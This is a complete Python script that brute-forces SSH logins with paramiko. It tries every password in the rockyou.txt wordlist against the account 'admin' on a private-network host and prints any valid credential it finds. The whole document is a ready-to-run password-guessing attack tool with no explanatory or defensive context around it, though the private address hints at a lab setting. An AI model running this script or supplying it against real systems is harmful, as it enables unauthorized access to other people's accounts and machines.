import paramiko
import socket
import sys

def attempt_login(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username,
                      password=password, timeout=3)
        return True   # Auth succeeded

    except paramiko.AuthenticationException:
        print(f"wrong password")
        return False  # Wrong password — expected, continue loop

    except socket.timeout:
        print(f"[!] Timeout on {host}:{port}")
        return False  # Treat as failure, continue loop

    except paramiko.SSHException as e:
        print(f"[!] SSH protocol error: {e}")
        return False  # Non-fatal, continue loop

    except socket.gaierror as e:
        print(f"[!] DNS failed: {e}")
        sys.exit(1)   # Fatal — entire script is pointless

    finally:
        client.close()  # Always runs

def brute_force(host, port, username, wordlist_path):
    with open(wordlist_path , "r", encoding="latin-1") as f:
        for line in f:
            password = line.strip()
            if not password:
                continue
            print(f"[*] Trying: {password}")
            if attempt_login(host, port, username, password):
                print(f"[+] Valid credential: {username}:{password}")
                return password
    print("[-] Exhausted wordlist")
    return None

host = "192.168.128.1"
port = 22
username = "admin"
wordlist_path = "/usr/share/wordlists/rockyou.txt"
brute_force(host, port, username, wordlist_path)

